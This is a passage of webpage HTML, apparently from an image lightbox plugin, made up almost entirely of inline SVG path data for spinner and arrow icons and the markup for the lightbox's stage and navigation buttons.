0.013 0.101 0.019 0.017 0.003 0.033 0.006 0.049 0.009s0.033 0.005 0.049 0.007c0.066 0.009 0.13 0.018 0.192 0.027 0.031 0.004 0.062 0.009 0.093 0.013s0.061 0.006 0.091 0.009 0.118 0.010 0.174 0.015c0.056 0.005 0.111 0.011 0.164 0.012 0.004 0 0.007 0 0.011 0 0.010 0.544 0.453 0.982 1 0.982 0.008 0 0.017-0 0.025-0.001v0c0 0 0.001-0 0.004-0 0.061-0.002 0.12-0.009 0.177-0.021 0.027-0.003 0.057-0.007 0.090-0.011 0.029-0.003 0.061-0.007 0.095-0.011 0.040-0.006 0.083-0.012 0.128-0.019 0.090-0.013 0.189-0.028 0.296-0.045 0.101-0.021 0.21-0.044 0.326-0.068 0.058-0.011 0.117-0.028 0.178-0.044s0.123-0.033 0.188-0.049c0.032-0.009 0.065-0.016 0.097-0.027s0.065-0.021 0.098-0.031 0.134-0.043 0.203-0.065c0.017-0.006 0.035-0.011 0.052-0.017s0.034-0.013 0.052-0.019 0.070-0.026 0.105-0.039c0.070-0.027 0.142-0.053 0.215-0.081 0.071-0.031 0.144-0.062 0.218-0.094 0.037-0.016 0.074-0.032 0.111-0.048s0.073-0.035 0.111-0.053 0.148-0.073 0.224-0.11c0.075-0.039 0.149-0.081 0.224-0.123 0.037-0.021 0.075-0.042 0.113-0.063s0.074-0.045 0.112-0.068 0.149-0.093 0.224-0.14c0.295-0.197 0.587-0.417 0.864-0.66 0.275-0.245 0.535-0.511 0.775-0.792 0.236-0.284 0.452-0.582 0.642-0.886 0.188-0.306 0.349-0.619 0.487-0.928 0.032-0.078 0.063-0.156 0.095-0.232 0.015-0.038 0.032-0.076 0.046-0.115s0.027-0.077 0.040-0.115 0.054-0.151 0.078-0.226c0.022-0.075 0.044-0.15 0.066-0.224 0.011-0.037 0.022-0.073 0.031-0.109s0.018-0.073 0.027-0.109 0.035-0.143 0.052-0.213c0.014-0.070 0.027-0.139 0.040-0.207 0.006-0.034 0.013-0.067 0.019-0.101 0.003-0.017 0.006-0.033 0.009-0.049s0.005-0.033 0.007-0.050c0.009-0.065 0.018-0.13 0.027-0.192 0.004-0.031 0.009-0.062 0.013-0.093s0.006-0.061 0.009-0.091 0.010-0.118 0.015-0.174c0.005-0.056 0.011-0.111 0.012-0.165 0-0.008 0.001-0.016 0.001-0.025 0.55-0.002 0.996-0.449 0.996-1 0-0.008-0-0.017-0.001-0.025h0c0 0-0-0.001-0-0.003-0.002-0.061-0.009-0.12-0.021-0.177-0.003-0.027-0.007-0.057-0.011-0.090-0.003-0.029-0.007-0.061-0.011-0.095-0.006-0.040-0.012-0.083-0.019-0.128-0.013-0.090-0.028-0.189-0.045-0.296-0.021-0.101-0.044-0.21-0.068-0.326-0.011-0.058-0.028-0.117-0.044-0.178s-0.032-0.123-0.049-0.188c-0.009-0.032-0.016-0.065-0.027-0.097s-0.021-0.065-0.031-0.098-0.043-0.134-0.065-0.203c-0.005-0.017-0.011-0.035-0.017-0.052s-0.013-0.034-0.019-0.052-0.026-0.070-0.039-0.105c-0.027-0.070-0.053-0.142-0.081-0.215-0.031-0.071-0.062-0.144-0.094-0.218-0.016-0.037-0.032-0.074-0.048-0.111s-0.035-0.073-0.053-0.111-0.073-0.148-0.11-0.224c-0.039-0.075-0.081-0.149-0.123-0.224-0.021-0.037-0.042-0.075-0.063-0.113s-0.045-0.074-0.068-0.112-0.093-0.149-0.14-0.224c-0.197-0.295-0.417-0.587-0.66-0.864-0.245-0.275-0.511-0.535-0.792-0.775-0.284-0.236-0.582-0.452-0.886-0.642-0.306-0.188-0.619-0.349-0.928-0.487-0.078-0.032-0.156-0.063-0.232-0.095-0.038-0.015-0.076-0.032-0.115-0.046s-0.077-0.027-0.115-0.040-0.151-0.054-0.226-0.078c-0.075-0.022-0.15-0.044-0.224-0.066-0.037-0.010-0.073-0.022-0.109-0.031s-0.073-0.018-0.109-0.027-0.143-0.035-0.213-0.052c-0.070-0.014-0.139-0.027-0.207-0.040-0.034-0.006-0.067-0.013-0.101-0.019-0.017-0.003-0.033-0.006-0.049-0.009s-0.033-0.005-0.049-0.007c-0.066-0.009-0.13-0.018-0.192-0.027-0.031-0.004-0.062-0.009-0.093-0.013s-0.061-0.006-0.091-0.009-0.118-0.010-0.174-0.015c-0.056-0.005-0.111-0.011-0.164-0.012-0.013-0-0.026-0.001-0.039-0.001-0.010-0.543-0.454-0.981-0.999-0.981-0.008 0-0.017 0-0.025 0.001l-0-0c0 0-0.001 0-0.003 0-0.061 0.002-0.12 0.009-0.177 0.021-0.027 0.003-0.057 0.007-0.090 0.011-0.029 0.003-0.061 0.007-0.095 0.011-0.040 0.006-0.083 0.012-0.128 0.019-0.090 0.013-0.189 0.028-0.296 0.045-0.101 0.021-0.21 0.044-0.326 0.068-0.058 0.011-0.117 0.028-0.178 0.044s-0.123 0.033-0.188 0.049c-0.032 0.009-0.065 0.016-0.097 0.027s-0.065 0.021-0.098 0.031-0.134 0.043-0.203 0.065c-0.017 0.006-0.035 0.011-0.052 0.017s-0.034 0.013-0.052 0.019-0.070 0.026-0.105 0.039c-0.070 0.027-0.142 0.053-0.215 0.081-0.071 0.031-0.144 0.062-0.218 0.094-0.037 0.016-0.074 0.032-0.111 0.048s-0.073 0.035-0.111 0.053-0.148 0.073-0.224 0.11c-0.075 0.039-0.149 0.081-0.224 0.123-0.037 0.021-0.075 0.042-0.113 0.063s-0.074 0.045-0.112 0.068-0.149 0.093-0.224 0.14c-0.295 0.198-0.587 0.417-0.864 0.66-0.275 0.245-0.535 0.511-0.775 0.792-0.236 0.284-0.452 0.582-0.642 0.886-0.188 0.306-0.349 0.619-0.487 0.928-0.032 0.078-0.063 0.156-0.095 0.232-0.015 0.038-0.032 0.076-0.046 0.115s-0.027 0.077-0.040 0.115-0.054 0.151-0.078 0.226c-0.022 0.075-0.044 0.15-0.066 0.224-0.011 0.037-0.022 0.073-0.032 0.109s-0.018 0.073-0.027 0.109-0.035 0.143-0.052 0.213c-0.014 0.070-0.027 0.139-0.040 0.207-0.006 0.034-0.013 0.067-0.019 0.101-0.003 0.017-0.006 0.033-0.009 0.049s-0.005 0.033-0.007 0.050c-0.009 0.065-0.018 0.13-0.027 0.192-0.004 0.031-0.009 0.062-0.013 0.093s-0.006 0.061-0.009 0.091-0.010 0.118-0.015 0.174c-0.005 0.056-0.011 0.111-0.012 0.165-0 0.009-0.001 0.017-0.001 0.025-0.537 0.017-0.967 0.458-0.967 0.999 0 0.008 0 0.017 0.001 0.025zM1.149 7.011c0.001-0.003 0.001-0.006 0.002-0.009 0.010-0.051 0.026-0.102 0.040-0.155s0.030-0.107 0.045-0.163c0.008-0.028 0.015-0.056 0.024-0.084s0.019-0.057 0.028-0.086 0.038-0.116 0.058-0.176c0.005-0.015 0.010-0.030 0.015-0.045s0.012-0.030 0.017-0.045 0.023-0.060 0.035-0.091 0.048-0.123 0.073-0.186c0.028-0.062 0.056-0.125 0.084-0.189 0.014-0.032 0.028-0.064 0.043-0.096s0.032-0.064 0.048-0.096 0.065-0.128 0.098-0.194c0.034-0.065 0.073-0.128 0.109-0.194 0.018-0.032 0.037-0.065 0.056-0.098s0.040-0.064 0.061-0.096c0.041-0.064 0.082-0.129 0.124-0.194 0.176-0.255 0.369-0.506 0.583-0.744 0.217-0.236 0.451-0.459 0.697-0.665 0.25-0.202 0.511-0.385 0.776-0.547 0.268-0.159 0.541-0.294 0.808-0.41 0.068-0.027 0.135-0.053 0.202-0.079 0.033-0.013 0.066-0.027 0.099-0.038s0.067-0.022 0.1-0.033 0.131-0.045 0.196-0.065c0.065-0.018 0.13-0.036 0.194-0.054 0.032-0.009 0.063-0.019 0.095-0.026s0.063-0.014 0.094-0.021 0.123-0.028 0.184-0.042c0.061-0.011 0.12-0.021 0.179-0.032 0.029-0.005 0.058-0.010 0.087-0.015 0.014-0.003 0.029-0.005 0.043-0.008s0.029-0.003 0.043-0.005c0.056-0.007 0.112-0.014 0.166-0.020 0.027-0.003 0.053-0.007 0.080-0.010s0.053-0.004 0.078-0.006 0.102-0.007 0.15-0.011c0.049-0.003 0.095-0.008 0.142-0.008 0.091-0.002 0.177-0.004 0.256-0.006 0.073 0.003 0.14 0.005 0.2 0.007 0.030 0.001 0.058 0.002 0.085 0.002 0.033 0.002 0.064 0.004 0.093 0.006 0.033 0.002 0.063 0.004 0.091 0.006 0.051 0.008 0.103 0.012 0.156 0.012 0.007 0 0.015-0 0.022-0.001 0.002 0 0.004 0 0.004 0v-0c0.487-0.012 0.887-0.372 0.962-0.84 0.008 0.002 0.017 0.004 0.025 0.006 0.051 0.010 0.102 0.026 0.155 0.040s0.107 0.030 0.163 0.045c0.028 0.008 0.056 0.015 0.084 0.024s0.057 0.019 0.086 0.028 0.116 0.038 0.176 0.058c0.015 0.005 0.030 0.010 0.045 0.015s0.030 0.012 0.045 0.017 0.060 0.023 0.091 0.035 0.123 0.048 0.186 0.073c0.062 0.028 0.125 0.056 0.189 0.084 0.032 0.014 0.064 0.028 0.096 0.043s0.064 0.032 0.096 0.048 0.128 0.065 0.194 0.098c0.065 0.034 0.129 0.073 0.194 0.109 0.032 0.018 0.065 0.037 0.098 0.056s0.064 0.040 0.096 0.061 0.129 0.082 0.194 0.124c0.255 0.176 0.506 0.369 0.744 0.583 0.236 0.217 0.459 0.451 0.665 0.697 0.202 0.25 0.385 0.511 0.547 0.776 0.159 0.268 0.294 0.541 0.41 0.808 0.027 0.068 0.053 0.135 0.079 0.202 0.013 0.033 0.027 0.066 0.038 0.099s0.022 0.067 0.033 0.1 0.045 0.131 0.065 0.196c0.018 0.065 0.036 0.13 0.054 0.194 0.009 0.032 0.019 0.063 0.026 0.095s0.014 0.063 0.021 0.094 0.028 0.123 0.042 0.184c0.011 0.061 0.021 0.12 0.032 0.179 0.005 0.029 0.010 0.058 0.015 0.087 0.003 0.014 0.005 0.029 0.008 0.043s0.003 0.029 0.005 0.043c0.007 0.056 0.014 0.112 0.020 0.166 0.003 0.027 0.007 0.053 0.010 0.080s0.004 0.053 0.006 0.078 0.007 0.102 0.011 0.15c0.003 0.049 0.008 0.095 0.008 0.142 0.002 0.091 0.004 0.177 0.006 0.256-0.003 0.073-0.005 0.14-0.007 0.2-0.001 0.030-0.002 0.058-0.002 0.085-0.002 0.033-0.004 0.064-0.006 0.093-0.002 0.033-0.004 0.063-0.006 0.091-0.008 0.051-0.012 0.103-0.012 0.156 0 0.007 0 0.015 0.001 0.022-0 0.002-0 0.004-0 0.004h0c0.012 0.481 0.363 0.877 0.823 0.959-0.001 0.005-0.002 0.009-0.003 0.014-0.010 0.051-0.025 0.102-0.040 0.155s-0.030 0.107-0.045 0.163c-0.008 0.028-0.015 0.056-0.024 0.084s-0.019 0.057-0.028 0.086-0.039 0.116-0.058 0.176c-0.005 0.015-0.010 0.030-0.015 0.045s-0.012 0.030-0.017 0.045-0.023 0.060-0.035 0.091-0.048 0.123-0.073 0.186c-0.028 0.062-0.056 0.125-0.084 0.189-0.014 0.032-0.028 0.064-0.043 0.096s-0.032 0.064-0.048 0.096-0.065 0.128-0.098 0.194c-0.034 0.065-0.073 0.129-0.109 0.194-0.018 0.032-0.037 0.065-0.056 0.098s-0.040 0.064-0.061 0.096-0.082 0.129-0.124 0.194c-0.176 0.255-0.369 0.506-0.583 0.744-0.217 0.236-0.451 0.459-0.697 0.665-0.25 0.202-0.511 0.385-0.776 0.547-0.268 0.159-0.541 0.294-0.808 0.41-0.068 0.027-0.135 0.053-0.202 0.079-0.033 0.013-0.066 0.027-0.099 0.038s-0.067 0.022-0.1 0.033-0.131 0.045-0.196 0.065c-0.065 0.018-0.13 0.036-0.194 0.054-0.032 0.009-0.063 0.019-0.095 0.026s-0.063 0.014-0.094 0.021-0.123 0.028-0.184 0.042c-0.061 0.011-0.12 0.021-0.179 0.032-0.029 0.005-0.058 0.010-0.087 0.015-0.014 0.003-0.028 0.005-0.043 0.008s-0.029 0.003-0.043 0.005c-0.056 0.007-0.112 0.014-0.166 0.020-0.027 0.003-0.053 0.007-0.080 0.010s-0.053 0.004-0.078 0.006-0.102 0.007-0.15 0.011c-0.049 0.003-0.095 0.008-0.142 0.008-0.091 0.002-0.177 0.004-0.256 0.006-0.073-0.003-0.14-0.005-0.2-0.007-0.030-0.001-0.058-0.002-0.085-0.002-0.033-0.002-0.064-0.004-0.093-0.006-0.033-0.002-0.063-0.004-0.091-0.006-0.051-0.008-0.103-0.012-0.156-0.012-0.007 0-0.015 0-0.022 0.001-0.002-0-0.003-0-0.003-0v0c-0.484 0.012-0.883 0.369-0.961 0.834-0.050-0.010-0.101-0.025-0.153-0.039s-0.107-0.030-0.163-0.045c-0.028-0.008-0.056-0.015-0.084-0.024s-0.057-0.019-0.086-0.028-0.116-0.039-0.176-0.058c-0.015-0.005-0.030-0.010-0.045-0.015s-0.030-0.012-0.045-0.017-0.060-0.023-0.091-0.035-0.123-0.048-0.186-0.073c-0.062-0.028-0.125-0.056-0.189-0.084-0.032-0.014-0.064-0.028-0.096-0.043s-0.064-0.032-0.096-0.048-0.128-0.065-0.194-0.098c-0.065-0.034-0.129-0.073-0.194-0.109-0.032-0.018-0.065-0.037-0.098-0.056s-0.064-0.040-0.096-0.061c-0.064-0.041-0.129-0.082-0.194-0.124-0.255-0.175-0.506-0.369-0.744-0.583-0.236-0.217-0.459-0.451-0.665-0.697-0.202-0.25-0.385-0.511-0.547-0.776-0.159-0.268-0.294-0.541-0.41-0.808-0.027-0.068-0.053-0.135-0.079-0.202-0.013-0.033-0.027-0.066-0.038-0.099s-0.022-0.067-0.033-0.1-0.045-0.131-0.065-0.196c-0.018-0.065-0.036-0.13-0.054-0.194-0.009-0.032-0.019-0.063-0.026-0.095s-0.014-0.063-0.021-0.094-0.028-0.123-0.042-0.184c-0.011-0.061-0.021-0.12-0.032-0.179-0.005-0.029-0.010-0.058-0.015-0.087-0.003-0.014-0.005-0.028-0.008-0.043s-0.003-0.029-0.005-0.043c-0.007-0.056-0.014-0.112-0.020-0.166-0.003-0.027-0.007-0.053-0.010-0.080s-0.004-0.053-0.006-0.078-0.007-0.101-0.011-0.15c-0.003-0.049-0.008-0.095-0.008-0.142-0.002-0.091-0.004-0.177-0.006-0.256 0.003-0.073 0.005-0.14 0.007-0.2 0.001-0.030 0.002-0.058 0.002-0.085 0.002-0.033 0.004-0.064 0.006-0.093 0.002-0.033 0.004-0.063 0.006-0.091 0.008-0.051 0.012-0.103 0.012-0.156 0-0.007-0-0.015-0.001-0.022 0-0.002 0-0.003 0-0.003h-0c-0.012-0.49-0.377-0.893-0.851-0.964z"></path><path class="fbx-icon-spinner-7" d="M16 6.5l-3.527-0.353 2.245-2.743-2.121-2.121-2.743 2.245-0.353-3.527h-3l-0.353 3.527-2.743-2.245-2.121 2.121 2.245 2.743-3.527 0.353v3l3.527 0.353-2.245 2.743 2.121 2.121 2.743-2.245 0.353 3.527h3l0.353-3.527 2.743 2.245 2.121-2.121-2.245-2.743 3.527-0.353v-3zM11 6.757v2.485l-1.757 1.757h-2.485l-1.757-1.757v-2.485l1.757-1.757h2.485l1.757 1.757z"></path><path class="fbx-icon-spinner-8" d="M13.657 2.343c-1.448-1.448-3.447-2.343-5.657-2.343-3.429 0-6.355 2.158-7.492 5.19l1.873 0.702c0.853-2.274 3.047-3.893 5.619-3.893 1.657 0 3.157 0.672 4.242 1.758l-2.242 2.242h6v-6l-2.343 2.343zM8 14c-1.657 0-3.157-0.672-4.242-1.758l2.242-2.242h-6v6l2.344-2.344c1.448 1.448 3.447 2.344 5.656 2.344 3.43 0 6.355-2.158 7.492-5.19l-1.873-0.702c-0.853 2.274-3.047 3.893-5.619 3.893z"></path><path class="fbx-icon-spinner-9" d="M8 3.25c-1.566 0-2.962 0.731-3.849 1.863l-1.2-0.9c1.161-1.496 2.992-2.464 5.048-2.464v-1.75l2.5 2.5-2.5 2.5v-1.75zM8 12.75c1.566 0 2.962-0.731 3.849-1.863l1.2 0.9c-1.161 1.496-2.992 2.464-5.048 2.464v1.75l-2.5-2.5 2.5-2.5v1.75zM3.15 8c0 1.568 0.78 2.961 1.98 3.827l-0.9 1.2c-1.564-1.139-2.58-2.968-2.58-5.026h-1.65l2.5-2.5 2.5 2.5h-1.85zM14.35 8h1.65l-2.5 2.5-2.5-2.5h1.85c0-1.568-0.78-2.961-1.98-3.827l0.9-1.2c1.564 1.139 2.58 2.968 2.58 5.026z"></path><path class="fbx-icon-spinner-10" d="M12.999 3.23v0 0zM13.032 8c1.631-1.56 2.423-3.087 1.896-4-0.301-0.521-0.99-0.77-1.929-0.77v0.75c0.659 0 1.137 0.148 1.28 0.395 0.113 0.195 0.050 0.496-0.023 0.713-0.139 0.417-0.442 0.917-0.876 1.444-0.263 0.32-0.567 0.643-0.904 0.963-0.465-0.402-0.982-0.801-1.544-1.188-0.055-0.679-0.142-1.327-0.257-1.93 0.878-0.26 1.675-0.397 2.323-0.397l0-0.75c-0 0-0 0-0 0-0.706 0-1.553 0.141-2.482 0.413-0.535-2.192-1.462-3.642-2.516-3.642s-1.981 1.45-2.516 3.642c-0.929-0.271-1.777-0.412-2.482-0.412-0.939 0-1.629 0.249-1.93 0.77-0.527 0.913 0.265 2.44 1.896 4-1.631 1.559-2.423 3.087-1.896 4 0.301 0.521 0.99 0.77 1.93 0.77 0.706 0 1.553-0.141 2.482-0.412 0.535 2.192 1.462 3.642 2.516 3.642s1.981-1.45 2.516-3.642c0.929 0.271 1.777 0.412 2.482 0.412 0.939 0 1.629-0.249 1.93-0.77 0.527-0.913-0.265-2.441-1.896-4zM11.915 8c-0.291 0.248-0.601 0.493-0.927 0.734 0.008-0.242 0.013-0.487 0.013-0.734s-0.004-0.492-0.013-0.734c0.327 0.241 0.637 0.486 0.927 0.734zM9.958 11.389c-0.36-0.128-0.728-0.274-1.098-0.435 0.213-0.113 0.426-0.232 0.64-0.355s0.424-0.25 0.63-0.378c-0.045 0.403-0.103 0.793-0.172 1.169zM9.125 9.949c-0.372 0.214-0.748 0.416-1.125 0.603-0.377-0.187-0.753-0.389-1.125-0.603-0.375-0.216-0.737-0.441-1.086-0.672-0.026-0.417-0.039-0.844-0.039-1.277s0.013-0.859 0.039-1.276c0.349-0.231 0.711-0.456 1.086-0.672 0.372-0.215 0.748-0.416 1.125-0.603 0.377 0.187 0.753 0.389 1.125 0.603 0.375 0.216 0.737 0.441 1.086 0.672 0.026 0.417 0.039 0.844 0.039 1.276s-0.013 0.859-0.039 1.277c-0.349 0.231-0.711 0.456-1.086 0.672zM5.87 10.22c0.205 0.128 0.415 0.254 0.63 0.378s0.427 0.242 0.64 0.355c-0.37 0.162-0.738 0.307-1.098 0.435-0.069-0.375-0.127-0.766-0.172-1.168zM5.013 8.734c-0.327-0.241-0.637-0.486-0.927-0.734 0.291-0.248 0.601-0.494 0.927-0.734-0.008 0.242-0.013 0.487-0.013 0.734s0.004 0.492 0.013 0.734zM6.042 4.612c0.36 0.128 0.728 0.274 1.098 0.435-0.213 0.113-0.426 0.232-0.64 0.355s-0.424 0.25-0.63 0.378c0.045-0.403 0.103-0.793 0.172-1.168zM9.5 5.402c-0.214-0.123-0.427-0.242-0.64-0.355 0.37-0.162 0.738-0.307 1.098-0.435 0.069 0.375 0.127 0.766 0.172 1.168-0.205-0.128-0.415-0.254-0.63-0.378zM6.581 2.607c0.24-0.639 0.521-1.151 0.813-1.48 0.152-0.172 0.381-0.376 0.607-0.376s0.454 0.205 0.607 0.376c0.292 0.329 0.573 0.841 0.813 1.48 0.146 0.388 0.273 0.812 0.382 1.265-0.58 0.202-1.185 0.45-1.801 0.743-0.616-0.292-1.221-0.541-1.801-0.743 0.109-0.453 0.237-0.877 0.382-1.265zM2.62 6.532c-0.434-0.527-0.736-1.026-0.876-1.444-0.073-0.218-0.135-0.518-0.023-0.713 0.143-0.247 0.621-0.395 1.28-0.395h0c0.648 0 1.445 0.137 2.323 0.397-0.115 0.603-0.202 1.251-0.257 1.93-0.561 0.387-1.079 0.787-1.544 1.188-0.338-0.321-0.641-0.643-0.904-0.963zM3.002 12.020c-0.659 0-1.137-0.148-1.28-0.395-0.113-0.195-0.050-0.496 0.023-0.713 0.139-0.417 0.442-0.917 0.876-1.444 0.263-0.32 0.567-0.643 0.904-0.963 0.465 0.402 0.982 0.801 1.544 1.188 0.055 0.679 0.142 1.327 0.257 1.93-0.878 0.26-1.675 0.397-2.323 0.397zM9.419 13.393c-0.24 0.639-0.521 1.151-0.813 1.48-0.152 0.172-0.381 0.376-0.607 0.376s-0.454-0.205-0.607-0.376c-0.292-0.329-0.573-0.841-0.813-1.48-0.146-0.388-0.273-0.812-0.382-1.265 0.58-0.202 1.185-0.45 1.801-0.743 0.616 0.292 1.221 0.541 1.801 0.743-0.109 0.453-0.236 0.877-0.382 1.265zM14.256 10.912c0.073 0.218 0.135 0.518 0.023 0.713-0.143 0.248-0.622 0.395-1.28 0.395-0.648 0-1.445-0.137-2.323-0.397 0.115-0.603 0.202-1.251 0.257-1.93 0.561-0.387 1.079-0.787 1.544-1.188 0.338 0.321 0.641 0.643 0.904 0.963 0.434 0.527 0.736 1.027 0.876 1.444zM6.75 8c0-0.69 0.56-1.25 1.25-1.25s1.25 0.56 1.25 1.25c0 0.69-0.56 1.25-1.25 1.25s-1.25-0.56-1.25-1.25z"></path><path class="fbx-icon-spinner-11" d="M7.282 8.718l-5-5-2.282 2.282v-6h6l-2.282 2.282 5 5zM8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8c-4.418 0-8-3.582-8-8h2c0 3.314 2.686 6 6 6s6-2.686 6-6c0-3.314-2.686-6-6-6v-2z"></path></svg></div><div class="fbx-inner fbx-inner-shadow"><div class="fbx-stage"><div class="fbx-item-current"></div><div class="fbx-item-next"></div><div class="fbx-caption fbx-slide-caption"></div></div><button class="fbx-prev fbx-btn-transition fbx-btn-shadow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-prev fbx-icon-default"><path class="fbx-icon-arrows-default" d="M14.57 8.643q0 0.473-0.29 0.808t-0.754 0.335h-6.286l2.616 2.625q0.339 0.321 0.339 0.804t-0.339 0.804l-0.67 0.679q-0.33 0.33-0.804 0.33-0.464 0-0.813-0.33l-5.813-5.821q-0.33-0.33-0.33-0.804 0-0.464 0.33-0.813l5.813-5.804q0.339-0.339 0.813-0.339 0.464 0 0.804 0.339l0.67 0.661q0.339 0.339 0.339 0.813t-0.339 0.813l-2.616 2.616h6.286q0.464 0 0.754 0.335t0.29 0.808z"></path><path class="fbx-icon-arrows-flat" d="M6.667 3q0.276 0 0.471 0.195t0.195 0.471q0 0.281-0.198 0.474l-3.526 3.526h10.391q0.276 0 0.471 0.195t0.195 0.471-0.195 0.471-0.471 0.195h-10.391l3.526 3.526q0.198 0.193 0.198 0.474 0 0.276-0.195 0.471t-0.471 0.195q-0.281 0-0.474-0.193l-4.667-4.667q-0.193-0.203-0.193-0.474t0.193-0.474l4.667-4.667q0.198-0.193 0.474-0.193z"></path><path class="fbx-icon-arrows-1" d="M10 16l3-3-5-5 5-5-3-3-8 8z"></path><path class="fbx-icon-arrows-2" d="M0 8l16 7-3-7 3-7z"></path><path class="fbx-icon-arrows-3" d="M12 0l-8 8 8 8-4-8z"></path><path class="fbx-icon-arrows-4" d="M10 4l-4 4 4 4z"></path><path class="fbx-icon-arrows-5" d="M0 8l8 8v-5h8l0-6h-8v-5l-8 8zM2.375 7.039l0.25-0.25v2.422l-0.25-0.25v-1.922zM2.125 8.711l-0.25-0.25v-0.922l0.25-0.25v1.422zM2.875 6.539l0.25-0.25v3.422l-0.25-0.25v-2.922zM3.375 6.039l0.25-0.25v4.422l-0.25-0.25v-3.922zM3.875 5.539l0.25-0.25v5.422l-0.25-0.25v-4.922zM4.375 5.039l0.25-0.25v6.422l-0.25-0.25v-5.922zM4.875 4.539l0.25-0.25v7.422l-0.25-0.25v-6.922zM5.375 4.039l0.25-0.25v8.422l-0.25-0.25v-7.922zM5.875 3.539l0.25-0.25v9.422l-0.25-0.25v-8.922zM6.375 3.039l0.25-0.25v10.422l-0.25-0.25v-9.922zM1.625 7.789v0.422l-0.211-0.211 0.211-0.211zM7.375 10v-4h0.25v4h-0.25zM7.875 10v-4h0.25v4h-0.25zM8.375 10v-4h0.25v4h-0.25zM8.875 10v-4h0.25v4h-0.25zM9.375 10v-4h0.25v4h-0.25zM9.875 10v-4h0.25v4h-0.25zM10.375 10v-4h0.25v4h-0.25zM10.875 10v-4h0.25v4h-0.25zM11.375 10v-4h0.25v4h-0.25zM11.875 10v-4h0.25v4h-0.25zM12.375 10v-4h0.25v4h-0.25zM12.875 10v-4h0.25v4h-0.25zM13.375 10v-4h0.25v4h-0.25zM13.875 10v-4h0.25v4h-0.25zM14.375 10v-4h0.25v4h-0.25zM15 10h-0.125v-4h0.125l-0 4zM7 6h0.125v4h-0.125v3.586l-0.125-0.125v-10.922l0.125-0.125v3.586z"></path><path class="fbx-icon-arrows-6" d="M0 8l8 8v-5h8l0-6h-8v-5z"></path><path class="fbx-icon-arrows-7" d="M8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8-8-3.582-8-8 3.582-8 8-8zM3.293 8.707l4 4c0.195 0.195 0.451 0.293 0.707 0.293s0.512-0.098 0.707-0.293c0.391-0.391 0.391-1.024 0-1.414l-2.293-2.293h5.586c0.552 0 1-0.448 1-1s-0.448-1-1-1h-5.586l2.293-2.293c0.391-0.391 0.391-1.024 0-1.414s-1.024-0.391-1.414 0l-4 4c-0.391 0.391-0.391 1.024-0 1.414z"></path><path class="fbx-icon-arrows-8" d="M0 16h16v-16h-16l0 16zM14 2v12h-12l-0-12h12zM7 11.5l-3.5-3.5 3.5-3.5v2.5h5v2h-5v2.5z"></path><path class="fbx-icon-arrows-9" d="M15 5h1v6h-1zM13 5h1v6h-1zM11 5h1v6h-1zM0 8l7-7v4h3v6h-3v4z"></path><path class="fbx-icon-arrows-10" d="M8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8-8-3.582-8-8 3.582-8 8-8zM7 11.5v-2.5h5v-2h-5v-2.5l-3.5 3.5 3.5 3.5z"></path><path class="fbx-icon-arrows-11" d="M8 0c4.418 0 8 3.582 8 8s-3.582 8-8 8-8-3.582-8-8 3.582-8 8-8zM8 14.5c3.59 0 6.5-2.91 6.5-6.5s-2.91-6.5-6.5-6.5-6.5 2.91-6.5 6.5 2.91 6.5 6.5 6.5zM3.293 7.293l4-4c0.391-0.391 1.024-0.391 1.414 0s0.391 1.024 0 1.414l-2.293 2.293h5.586c0.552 0 1 0.448 1 1s-0.448 1-1 1h-5.586l2.293 2.293c0.391 0.391 0.391 1.024 0 1.414-0.195 0.195-0.451 0.293-0.707 0.293s-0.512-0.098-0.707-0.293l-4-4c-0.39-0.391-0.39-1.024 0-1.414z"></path></svg></button><span class="fbx-count"></span><button class="fbx-next fbx-btn-transition fbx-btn-shadow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-next fbx-icon-default"><path class="fbx-icon-arrows-default" d="M14.57 8.071q0 0.482-0.33 0.813l-5.813 5.813q-0.348 0.33-0.813 0.33-0.455 0-0.804-0.33l-0.67-0.67q-0.339-0.339-0.339-0.813t0.339-0.813l2.616-2.616h-6.286q-0.464 0-0.754-0.335t-0.29-0.808v-1.143q0-0.473 0.29-0.808t0.754-0.335h6.286l-2.616-2.625q-0.339-0.321-0.339-0.804t0.339-0.804l0.67-0.67q0.339-0.339 0.804-0.339 0.473 0 0.813 0.339l5.813 5.813q0.33 0.313 0.33 0.804z"></path><path class="fbx-icon-arrows-flat" d="M9.333 3q0.281 0 0.474 0.193l4.667 4.667q0.193 0.193 0.193 0.474t-0.193 0.474l-4.667 4.667q-0.193 0.193-0.474 0.193-0.286 0-0.477-0.19t-0.19-0.477q0-0.281 0.193-0.474l3.531-3.526h-10.391q-0.276 0-0.471-0.195t-0.195-0.471 0.195-0.471 0.471-0.195h10.391l-3.531-3.526q-0.193-0.193-0.193-0.474 0-0.286 0.19-0.477t0.477-0.19z"></path><path class="fbx-icon-arrows-1" d="M6 0l-3 3 5 5-5 5 3 3 8-8z"></path><path class="fbx-icon-arrows-2" d="M16 8l-16-7 3 7-3 7z"></path><path class="fbx-icon-arrows-3" d="M4 16l8-8-8-8 4 8z"></path><path class="fbx-icon-arrows-4" d="M6 12l4-4-4-4z"></path><path class="fbx-icon-arrows-5" d="M16 8l-8-8v5h-8l-0 6h8v5l8-8zM13.625 8.961l-0.25 0.25v-2.422l0.25 0.25v1.922zM13.875 7.289l0.25 0.25v0.922l-0.25 0.25v-1.422zM13.125 9.461l-0.25 0.25v-3.422l0.25 0.25v2.922zM12.625 9.961l-0.25 0.25v-4.422l0.25 0.25v3.922zM12.125 10.461l-0.25 0.25v-5.422l0.25 0.25v4.922zM11.625 10.961l-0.25 0.25v-6.422l0.25 0.25v5.922zM11.125 11.461l-0.25 0.25v-7.422l0.25 0.25v6.922zM10.625 11.961l-0.25 0.25v-8.422l0.25 0.25v7.922zM10.125 12.461l-0.25 0.25v-9.422l0.25 0.25v8.922zM9.625 12.961l-0.25 0.25v-10.422l0.25 0.25v9.922zM14.375 8.211v-0.422l0.211 0.211-0.211 0.211zM8.625 6v4h-0.25v-4h0.25zM8.125 6v4h-0.25v-4h0.25zM7.625 6v4h-0.25v-4h0.25zM7.125 6v4h-0.25v-4h0.25zM6.625 6v4h-0.25v-4h0.25zM6.125 6v4h-0.25v-4h0.25zM5.625 6v4h-0.25v-4h0.25zM5.125 6v4h-0.25v-4h0.25zM4.625 6v4h-0.25v-4h0.25zM4.125 6v4h-0.25v-4h0.25zM3.625 